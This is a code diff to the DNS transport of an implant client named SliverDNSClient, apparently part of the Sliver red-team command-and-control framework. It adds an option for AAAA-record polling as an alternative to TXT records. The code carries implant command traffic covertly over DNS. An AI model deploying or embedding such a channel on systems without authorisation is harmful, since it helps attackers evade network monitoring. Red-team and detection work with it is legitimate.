@@ -92,6 +92,7 @@ var (
 	ErrInvalidResponse     = errors.New("invalid response")
 	ErrInvalidIndex        = errors.New("invalid start/stop index")
 	ErrEmptyResponse       = errors.New("empty response")
+	ErrInvalidMsg          = errors.New("invalid dns message")
 )
 
 // DNSOptions - c2 specific options
@@ -102,6 +103,7 @@ type DNSOptions struct {
 	MaxErrors          int
 	WorkersPerResolver int
 	ForceBase32        bool
+	NoTXT              bool
 	ForceResolvConf    string
 	ForceResolvers     string
 }
@@ -141,6 +143,7 @@ func ParseDNSOptions(c2URI *url.URL) *DNSOptions {
 		MaxErrors:          maxErrors,
 		WorkersPerResolver: workersPerResolver,
 		ForceBase32:        strings.ToLower(c2URI.Query().Get("force-base32")) == "true",
+		NoTXT:              strings.ToLower(c2URI.Query().Get("notxt")) == "true",
 		ForceResolvConf:    c2URI.Query().Get("force-resolv-conf"),
 		ForceResolvers:     c2URI.Query().Get("resolvers"),
 	}
@@ -167,6 +170,7 @@ func NewDNSClient(parent string, opts *DNSOptions) *SliverDNSClient {
 		metadata:        map[string]*ResolverMetadata{},
 		parent:          parent,
 		forceBase32:     opts.ForceBase32,
+		noTXT:           opts.NoTXT,
 		forceResolvConf: opts.ForceResolvConf,
 		forceResolvers:  opts.ForceResolvers,
 		queryTimeout:    opts.QueryTimeout,
@@ -192,6 +196,7 @@ type SliverDNSClient struct {
 	retryCount      int
 	queryTimeout    time.Duration
 	forceBase32     bool
+	noTXT           bool
 	forceResolvConf string
 	forceResolvers  string
 	subdataSpace    int
@@ -256,6 +261,8 @@ func (w *DNSWorker) Start(id int, recvQueue <-chan *DNSWork, sendQueue <-chan *D
 			switch work.QueryType {
 			case dns.TypeA:
 				data, _, err = w.resolver.A(work.Domain)
+			case dns.TypeAAAA:
+				data, _, err = w.resolver.AAAA(work.Domain)
 			case dns.TypeTXT:
 				data, _, err = w.resolver.TXT(work.Domain)
 			}
@@ -292,7 +299,7 @@ func (s *SliverDNSClient) SessionInit() error {
 	s.resolvers = []DNSResolver{}
 	for _, server := range s.resolvConf.Servers {
 		s.resolvers = append(s.resolvers,
-			NewGenericResolver(server, s.resolvConf.Port, s.retryWait, s.retryCount, s.queryTimeout),
+			NewGenericResolver(server, s.resolvConf.Port, s.retryWait, s.retryCount, s.queryTimeout, s.parent),
 		)
 	}
 	// {{if .Config.Debug}}
@@ -389,15 +396,34 @@ func (s *SliverDNSClient) sendInit(resolver DNSResolver, encoder encoders.Encode
 	}
 	resp := []byte{}
 	for _, subdata := range allSubdata {
-		respData, _, err := resolver.TXT(subdata)
-		if err != nil {
-			// {{if .Config.Debug}}
-			log.Printf("[dns] init msg failure %v", err)
-			// {{end}}
-			return nil, err
-		}
-		if 0 < len(respData) {
-			resp = append(resp, respData...)
+
+		if s.noTXT {
+			respData, _, err := resolver.AAAA(subdata)
+			if err != nil {
+				// {{if .Config.Debug}}
+				log.Printf("[dns] init msg failure %v", err)
+				// {{end}}
+				return nil, err
+			}
+			if 0 < len(respData) {
+				msg := &dnspb.DNSMessage{}
+				err = proto.Unmarshal(respData, msg)
+				if err == nil {
+					msgData := msg.Data
+					resp = append(resp, msgData...)
+				}
+			}
+		} else {
+			respData, _, err := resolver.TXT(subdata)
+			if err != nil {
+				// {{if .Config.Debug}}
+				log.Printf("[dns] init msg failure %v", err)
+				// {{end}}
+				return nil, err
+			}
+			if 0 < len(respData) {
+				resp = append(resp, respData...)
+			}
 		}
 	}
 	return resp, nil
@@ -425,6 +451,7 @@ func (s *SliverDNSClient) WriteEnvelope(envelope *pb.Envelope) error {
 
 // ReadEnvelope - Recv an envelope from the server
 func (s *SliverDNSClient) ReadEnvelope() (*pb.Envelope, error) {
+	var respData []byte
 	if s.closed {
 		return nil, ErrClosed
 	}
@@ -444,10 +471,19 @@ func (s *SliverDNSClient) ReadEnvelope() (*pb.Envelope, error) {
 	// {{if .Config.Debug}}
 	log.Printf("[dns] poll msg domain: %v", domain)
 	// {{end}}
-	respData, _, err := resolver.TXT(domain)
-	if err != nil {
-		return nil, err
+
+	if s.noTXT {
+		respData, _, err = resolver.AAAA(domain)
+		if err != nil {
+			return nil, err
+		}
+	} else {
+		respData, _, err = resolver.TXT(domain)
+		if err != nil {
+			return nil, err
+		}
 	}
+
 	// {{if .Config.Debug}}
 	log.Printf("[dns] read msg resp data: %v", respData)
 	// {{end}}
@@ -554,11 +590,21 @@ func (s *SliverDNSClient) parallelRecv(manifest *dnspb.DNSMessage) ([]byte, erro
 		}
 
 		wg.Add(1)
-		s.recvQueue <- &DNSWork{
-			QueryType: dns.TypeTXT,
-			Domain:    domain,
-			Wg:        wg,
-			Results:   results,
+
+		if s.noTXT {
+			s.recvQueue <- &DNSWork{
+				QueryType: dns.TypeAAAA,
+				Domain:    domain,
+				Wg:        wg,
+				Results:   results,
+			}
+		} else {
+			s.recvQueue <- &DNSWork{
+				QueryType: dns.TypeTXT,
+				Domain:    domain,
+				Wg:        wg,
+				Results:   results,
+			}
 		}
 	}
 
